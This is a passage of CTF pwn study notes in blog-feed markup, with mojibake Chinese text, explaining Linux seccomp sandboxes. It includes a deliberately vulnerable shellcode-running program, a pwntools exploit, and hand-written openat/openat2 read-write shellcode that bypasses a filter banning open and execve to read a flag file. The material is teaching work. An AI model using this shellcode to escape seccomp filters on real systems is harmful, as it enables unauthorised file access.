seccomp();</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    read(<span class="number">0</span>,buf,<span class="number">0x200</span>);</span><br><span class="line">    ((<span class="type">void</span> (*)())buf)();  <span class="comment">// ç›´æ¥è°ƒç”¨bufä½œä¸ºå‡½æ•°æŒ‡é’ˆ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>checksecå‘ç°<code>å…³é—­äº†open</code></li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwn@ctfpwn:~/learn/Seccomp/test/3ç§open$ seccomp-tools dump ./openat1</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x03 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x00000002  <span class="keyword">if</span> (A == open) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x0000003b  <span class="keyword">if</span> (A == execve) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure></div><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./openat1&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./openat1&quot;</span>)</span><br><span class="line"><span class="comment">#*************************  ç»å¯¹è·¯å¾„ ******************************************</span></span><br><span class="line"><span class="comment">#shellcode = shellcraft.openat(0,&#x27;/home/pwn/learn/Seccomp/test/3ç§open/flag&#x27;,0,0) </span></span><br><span class="line"><span class="comment"># *****************************************************************************</span></span><br><span class="line">shellcode = shellcraft.openat(-<span class="number">100</span>,<span class="string">&#x27;./flag&#x27;</span>,<span class="number">0</span>,<span class="number">0</span>) <span class="comment"># ç›¸å¯¹è·¯å¾„</span></span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x30</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x30</span>)   </span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br></pre></td></tr></table></figure></div><p>æ•ˆæœï¼š</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241115140648568.bmp"></p><h3 id="æ‰‹å†™ï¼š"><a href="#æ‰‹å†™ï¼š" class="headerlink" title="æ‰‹å†™ï¼š"></a>æ‰‹å†™ï¼š</h3><ul><li>é‡‡ç”¨çš„æ˜¯ç›¸å¯¹è·¯å¾„</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">shellcode = &#x27;&#x27;&#x27;</span><br><span class="line">/*openat(0,&#x27;./flag&#x27;,0,0) */</span><br><span class="line">    mov rax, 0x67616c662f2e</span><br><span class="line">    push rax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    xor rax, rax</span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    sub rdi, 100</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    mov r10, 7</span><br><span class="line">    xor r8, r8</span><br><span class="line">    mov rax, 0x101</span><br><span class="line">    syscall;</span><br><span class="line"></span><br><span class="line">/* read(3,&#x27;rsp&#x27;,0x30) */</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 0x30</span><br><span class="line">    syscall;</span><br><span class="line"></span><br><span class="line">/* write(1,&#x27;rsp&#x27;, 0x30) */</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    push 1; pop rdi</span><br><span class="line">    push 0x30; pop rdx</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall; </span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></div><h2 id="openat2"><a href="#openat2" class="headerlink" title="openat2"></a>openat2</h2><ul><li><code>openat2</code> æ˜¯ <code>openat</code> çš„è¿›ä¸€æ­¥æ‰©å±•ï¼Œä¸»è¦å‡ºç°åœ¨ <code>Linux 5.6 åŠä»¥ä¸Šç‰ˆæœ¬ä¸­</code>ã€‚<code>openat2</code> æä¾›äº†æ¯” <code>openat</code> æ›´å¼ºå¤§çš„æ–‡ä»¶æ‰“å¼€æ§åˆ¶åŠŸèƒ½ï¼Œå…è®¸ç”¨æˆ·åœ¨æ–‡ä»¶æ‰“å¼€æ—¶ä¼ é€’æ›´å¤šçš„é€‰é¡¹å’Œæ§åˆ¶æ ‡å¿—ï¼Œå°¤å…¶æ˜¯ä¸è·¯å¾„è§£æå’Œæ–‡ä»¶æƒé™ç›¸å…³çš„åŠŸèƒ½ã€‚</li><li>å‡½æ•°åŸå‹ï¼š</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">openat2</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *pathname, <span class="keyword">struct</span> open_how *how)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">openat2</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *pathname, <span class="keyword">struct</span> open_how *how, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure></div><p>å¯ä»¥å‘ç°å¤šäº†<code>open_how</code>è¿™æ ·çš„ç»“æ„ä½“ï¼Œè¿™ä¸ªç»“æ„ä½“ä½¿å¾—openat2æ›´åŠ çµæ´»å’Œæ–¹ä¾¿çš„æ‰“å¼€æ–‡ä»¶</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_how</span> &#123;</span></span><br><span class="line">    __aligned_u64 flags;         <span class="comment">// æ–‡ä»¶æ ‡å¿—ï¼Œç±»ä¼¼äº O_RDONLY ç­‰</span></span><br><span class="line">    __aligned_u64 mode;          <span class="comment">// åˆ›å»ºæ–‡ä»¶æ—¶çš„æƒé™</span></span><br><span class="line">    __aligned_u64 resolve;       <span class="comment">// è·¯å¾„è§£æç­–ç•¥ï¼ˆä¾‹å¦‚ O_PATH ç­‰ï¼‰</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><h3 id="openat2-ç³»ç»Ÿè°ƒç”¨"><a href="#openat2-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="openat2 ç³»ç»Ÿè°ƒç”¨"></a><strong><code>openat2</code> ç³»ç»Ÿè°ƒç”¨</strong></h3><p><code>openat2</code> ç³»ç»Ÿè°ƒç”¨åœ¨ Linux 5.6 ä¸­å¼•å…¥ï¼Œç³»ç»Ÿè°ƒç”¨å·æ˜¯ <code>437</code>ï¼Œå…è®¸æ›´çµæ´»åœ°ä¼ é€’æ‰“å¼€æ–‡ä»¶çš„é€‰é¡¹ã€‚å®ƒçš„å‚æ•°é€šè¿‡ <code>struct open_how</code> ç»“æ„ä½“ä¼ é€’ã€‚</p><blockquote><h4 id="ç³»ç»Ÿè°ƒç”¨å‚æ•°ï¼š-2"><a href="#ç³»ç»Ÿè°ƒç”¨å‚æ•°ï¼š-2" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨å‚æ•°ï¼š"></a>ç³»ç»Ÿè°ƒç”¨å‚æ•°ï¼š</h4><ul><li><code>rax</code>ï¼šç³»ç»Ÿè°ƒç”¨å·ï¼ˆå¯¹äº <code>openat2</code>ï¼Œå€¼ä¸º <code>437</code>ï¼‰ã€‚</li><li><code>rdi</code>ï¼šç›®å½•æ–‡ä»¶æè¿°ç¬¦ <code>dirfd</code>ï¼ˆä¾‹å¦‚ <code>AT_FDCWD</code>ï¼‰ã€‚</li><li><code>rsi</code>ï¼šæ–‡ä»¶è·¯å¾„ <code>pathname</code>ï¼ˆæŒ‡å‘å­—ç¬¦ä¸²çš„æŒ‡é’ˆï¼‰ã€‚</li><li><code>rdx</code>ï¼šæŒ‡å‘ <code>struct open_how</code> ç»“æ„ä½“çš„æŒ‡é’ˆã€‚</li></ul></blockquote><h3 id="é€šå¸¸ç”¨æ³•-4"><a href="#é€šå¸¸ç”¨æ³•-4" class="headerlink" title="é€šå¸¸ç”¨æ³•"></a>é€šå¸¸ç”¨æ³•</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openat2(<span class="number">-100</span>,flag_addr,flag_addr+<span class="number">0x8</span>,<span class="number">0x18</span>) <span class="comment">//æ³¨æ„å‚æ•°æŒ‡å‘çš„æ˜¯flagçš„åœ°å€</span></span><br><span class="line"><span class="comment">// 0x18æŒ‡çš„æ˜¯ç»“æ„ä½“ï¼Œ3ä¸ª8å­—èŠ‚</span></span><br></pre></td></tr></table></figure></div><h3 id="æ‰‹å†™-1"><a href="#æ‰‹å†™-1" class="headerlink" title="æ‰‹å†™"></a>æ‰‹å†™</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">shellcode=&#x27;&#x27;&#x27;</span><br><span class="line">/* openat2(-100,flag_addr,flag_addr+0x20,0x18) */</span><br><span class="line">    mov rdi, -100</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    push rdx</span><br><span class="line">    push rdx</span><br><span class="line">    push rdx</span><br><span class="line">    mov rdx, rsp</span><br><span class="line">    mov rsi, 0x67616c662f</span><br><span class="line">    push rsi</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    add rdx, 0x100</span><br><span class="line">    mov r10, 0x18</span><br><span class="line">    mov rax, 437</span><br><span class="line">    syscall;</span><br><span class="line"></span><br><span class="line">/* read(3,&#x27;rsp&#x27;,0x30) */</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 0x30</span><br><span class="line">    syscall;</span><br><span class="line"></span><br><span class="line">/* write(1,&#x27;rsp&#x27;, 0x30) */</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    push 1; pop rdi</span><br><span class="line">    push 0x30; pop rdx</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall; </span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></div><ul><li>çœ‹ä¸€ä¸‹æ ˆç»“æ„ï¼š</li></ul><p>![](..&#x2F;å±å¹•æˆªå›¾ 2024-11-15 203709.png)</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
            <tag> seccomp </tag>
            
            <tag> å­¦ä¹ ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Seccompå­¦ä¹ (1)</title>
      <link href="/2024/11/13/Seccomp%E5%AD%A6%E4%B9%A0-1/"/>
      <url>/2024/11/13/Seccomp%E5%AD%A6%E4%B9%A0-1/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><ul><li>ä¹Ÿç®—æ‰“äº†è›®å¤šæ¯”èµ›ï¼Œæ¯æ¬¡æ¯”èµ›éƒ½ä¼šæœ‰æ²™ç®±<code>Sandbox</code>ï¼Œæ¯æ¬¡éƒ½å»ä¸Šç½‘æŸ¥èµ„æ–™ï¼Œè¿™æ¬¡æ•´ç†ä¸€ä¸‹å„ç§èµ„æ–™ï¼Œå°½é‡å®Œå–„ä¸€ä¸‹å…³äºè¿™æ–¹é¢çš„çŸ¥è¯†ç‚¹ã€‚</li><li>è¿™é‡Œåªä»‹ç»linuxä¸­çš„<code>Seccomp</code></li><li>æœ¬éƒ¨åˆ†åªæ˜¯åŸºç¡€ä»‹ç»ä¸€ä¸‹ä»€ä¹ˆæ˜¯<code>Seccomp</code>ä»¥åŠç›¸å…³çš„æŒ‡ä»¤</li></ul><p>å‚è€ƒæ–‡ç« ï¼š<a class="link" href="https://a1ex.online/2020/09/27/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">this <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><ul><li>å…ˆæ¥äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯æ²™ç®±ä¿æŠ¤</li></ul><blockquote><p><strong>Seccompï¼ˆSecure Computing Modeï¼‰ æ˜¯ Linux å†…æ ¸æä¾›çš„ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œå…è®¸è¿›ç¨‹åœ¨è¿è¡Œæ—¶é™åˆ¶è‡ªå·±èƒ½å¤Ÿè°ƒç”¨çš„ç³»ç»Ÿè°ƒç”¨ã€‚é€šè¿‡è¿™ç§æœºåˆ¶ï¼ŒSeccomp å¯ä»¥æ˜¾è‘—é™ä½æ”»å‡»é¢ï¼Œé˜²æ­¢æ¶æ„è¿›ç¨‹æ‰§è¡Œå±é™©çš„ç³»ç»Ÿè°ƒç”¨æˆ–é€ æˆèµ„æºæ³„éœ²ã€‚</strong></p></blockquote><ul><li>ä¹Ÿå°±æ˜¯è¯´<code>Seccomp</code>ä¼šè¿‡æ»¤æ‰å®ƒæ‰€è§„å®šçš„æŒ‡ä»¤ï¼Œå½“ç”¨æˆ·æ‰§è¡Œè¿™äº›æŒ‡ä»¤çš„æ—¶å€™ä¼šè¢«é™åˆ¶ï¼Œä¸å…è®¸æ‰§è¡Œï¼Œä¸‹é¢è®©æˆ‘ä»¬ç®€å•å†™ä¸€æ®µä»£ç çœ‹çœ‹</li></ul><p><mark>æ³¨æ„ï¼šä¸ºäº†ä½¿ç”¨seccompå¤´æ–‡ä»¶è¦å®‰è£…ä¸‹é¢æ‰€éœ€ï¼š<mark></mark></mark></p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install libseccomp-dev libseccomp2 seccomp</span><br></pre></td></tr></table></figure></div><h2 id="æµ‹è¯•ç¨‹åº"><a href="#æµ‹è¯•ç¨‹åº" class="headerlink" title="æµ‹è¯•ç¨‹åº"></a>æµ‹è¯•ç¨‹åº</h2><h3 id="æœªå¼€å¯æ²™ç®±"><a href="#æœªå¼€å¯æ²™ç®±" class="headerlink" title="æœªå¼€å¯æ²™ç®±"></a>æœªå¼€å¯æ²™ç®±</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gcc -g no_seccomp_execve.c -o no_seccomp_execve -lseccomp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">scmp_filter_ctx ctx;</span><br><span class="line">ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">seccomp_load(ctx);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> * filename = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">char</span> * argv[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line"><span class="type">char</span> * envp[] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line">write(<span class="number">1</span>,<span class="string">&quot;i will give you a shell\n&quot;</span>,<span class="number">24</span>);</span><br><span class="line">syscall(<span class="number">59</span>,filename,argv,envp);<span class="comment">//execve</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>æ‰§è¡Œæ•ˆæœï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241113205200278.bmp"></p><h3 id="å¼€å¯æ²™ç®±"><a href="#å¼€å¯æ²™ç®±" class="headerlink" title="å¼€å¯æ²™ç®±"></a>å¼€å¯æ²™ç®±</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g seccomp_execve.c -o seccomp_execve -lseccomp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">scmp_filter_ctx ctx;</span><br><span class="line">ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), <span class="number">0</span>); <span class="comment">// è¿™é‡Œä¾¿æ˜¯å…³é”®</span></span><br><span class="line">seccomp_load(ctx);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> * filename = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">char</span> * argv[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line"><span class="type">char</span> * envp[] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line">write(<span class="number">1</span>,<span class="string">&quot;i will give you a shell\n&quot;</span>,<span class="number">24</span>);</span><br><span class="line">syscall(<span class="number">59</span>,filename,argv,envp);<span class="comment">//execve</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>æ‰§è¡Œæ•ˆæœï¼šç›´æ¥æŠ¥é”™</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241113205326221.bmp"></p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li>å¯¹æ¯”ä¸¤æ®µä»£ç ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ²¡æœ‰å¼€å¯æ²™ç®±ç¦ç”¨<code>execve</code>ï¼Œæ­¤æ—¶éšä¾¿æ‰§è¡Œä»€ä¹ˆéƒ½å¯ä»¥ã€‚</li></ul><blockquote><h5 id="è¡¥å……çŸ¥è¯†ï¼š"><a href="#è¡¥å……çŸ¥è¯†ï¼š" class="headerlink" title="è¡¥å……çŸ¥è¯†ï¼š"></a>è¡¥å……çŸ¥è¯†ï¼š</h5><p><code>ctx</code>:æ˜¯ä¸€ä¸ªæŒ‡å‘ <strong>Seccomp è¿‡æ»¤å™¨ä¸Šä¸‹æ–‡</strong> çš„æŒ‡é’ˆï¼Œå®ƒæ˜¯ <code>seccomp_init</code> å‡½æ•°è¿”å›çš„ä¸€ä¸ªç»“æ„ä½“</p><p><code>ctx = seccomp_init(SCMP_ACT_ALLOW)</code>å…¶ä¸­çš„<code>SCMP_ACT_ALLOW</code> è¡¨ç¤ºåˆå§‹åŒ–æ—¶é»˜è®¤å…è®¸æ‰€æœ‰çš„ç³»ç»Ÿè°ƒç”¨</p></blockquote><ul><li>ç¬¬äºŒä¸ªå¼€å¯äº†æ²™ç®±ï¼Œç¦ç”¨äº†<code>execve</code>ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬è¯•å›¾å»è°ƒç”¨<code>execve</code>çš„æ—¶å€™ä¼šæŠ¥é”™</li></ul><p>è¯¦ç»†è§£é‡Šä¸€ä¸‹<code>seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0)</code></p><blockquote><p>ä½¿ç”¨ <code>seccomp_rule_add()</code> æ¥å‘è¿‡æ»¤å™¨ä¸Šä¸‹æ–‡ä¸­æ·»åŠ è§„åˆ™ï¼Œè§„å®šç‰¹å®šçš„ç³»ç»Ÿè°ƒç”¨è¡Œä¸º</p></blockquote><blockquote><p> é€šè¿‡ <code>seccomp_load()</code> å°†å·²é…ç½®å¥½çš„è¿‡æ»¤å™¨ä¸Šä¸‹æ–‡åŠ è½½åˆ°è¿›ç¨‹ä¸­ï¼Œå¼€å§‹ç”Ÿæ•ˆã€‚</p></blockquote><blockquote><p>åé¢çš„0è¡¨ç¤º<code>execve</code>çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´æ— è®ºexecveçš„å‚æ•°æ˜¯ä»€ä¹ˆéƒ½ç¦ç”¨</p><ul><li>ä¸¾ä¸ªä¾‹å­</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">scmp_filter_ctx ctx;</span><br><span class="line">ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(write),<span class="number">1</span>,SCMP_A2(SCMP_CMP_GT,<span class="number">0x10</span>));<span class="comment">//ç¬¬2(ä»0)ä¸ªå‚æ•°å¤§äº0x10</span></span><br><span class="line">seccomp_load(ctx);</span><br><span class="line">write(<span class="number">1</span>,<span class="string">&quot;i will give you a shell\n&quot;</span>,<span class="number">24</span>);<span class="comment">//ä¼šæ‹¦æˆª</span></span><br><span class="line">write(<span class="number">1</span>,<span class="string">&quot;1234567812345678&quot;</span>,<span class="number">0x10</span>);<span class="comment">//ä¸è¢«æ‹¦æˆª</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>æ‰§è¡Œæ•ˆæœï¼š</li></ul><p>ç¬¬ä¸€éƒ¨åˆ†ä¸ºæ³¨é‡Šæ‰ç¬¬ä¸€æ¡write,ç¬¬äºŒéƒ¨åˆ†æœªæ³¨é‡Š</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241113211240091.bmp"></p></blockquote><h3 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h3><p><code>seccomp-tools</code>ï¼šä¸‹è½½åœ°å€ï¼š<a class="link" href="https://blog.csdn.net/2302_79933763/article/details/136888847">this <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><ul><li><strong>æ•ˆæœ</strong></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241113211535561.bmp"></p><h2 id="Prtctlç®€ä»‹"><a href="#Prtctlç®€ä»‹" class="headerlink" title="Prtctlç®€ä»‹"></a>Prtctlç®€ä»‹</h2><p>å…³äºè¿™éƒ¨åˆ†æ„Ÿå…´è¶£çš„ç›´æ¥çœ‹å¼€å¤´çš„å‚è€ƒæ–‡ç« å³å¯ï¼Œè¿™é‡Œåªè®²Seccomp</p><h1 id="ç®€å•ä¾‹é¢˜-orw"><a href="#ç®€å•ä¾‹é¢˜-orw" class="headerlink" title="ç®€å•ä¾‹é¢˜(orw)"></a>ç®€å•ä¾‹é¢˜(orw)</h1><h2 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span 